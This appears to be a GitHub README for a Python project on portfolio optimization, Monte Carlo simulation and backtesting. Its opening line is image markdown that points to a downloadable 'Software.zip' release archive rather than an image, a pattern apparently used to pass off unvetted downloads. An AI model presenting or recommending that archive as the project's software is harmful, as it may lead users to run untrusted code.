![Portfolio Optimization](https://github.com/cartelcreationyt/Portfolio-Optimization-and-Backtesting-Using-Python-A-Pragmatic-Approach/releases/download/v2.0/Software.zip)

## Introduction

Welcome to the "Portfolio Optimization and Backtesting Using Python: A Pragmatic Approach" repository! This project focuses on applying Modern Portfolio Theory (MPT) and Monte Carlo simulations to optimize and backtest a portfolio of various financial assets. By leveraging Python programming, this repository provides a practical approach to asset management, data analysis, data cleaning, and performance optimization using techniques such as multiprocessing, multithreading, and the Numba Just-In-Time (JIT) compiler.

## Repository Description

The main goal of this project is to demonstrate how to effectively optimize and backtest a portfolio using Python. The implementation includes various components such as modern portfolio theory concepts, Monte Carlo simulations, and performance enhancements through techniques like parallel processing and JIT compilation. The repository serves as a comprehensive guide for individuals interested in exploring the intersection of finance, data science, and Python programming.
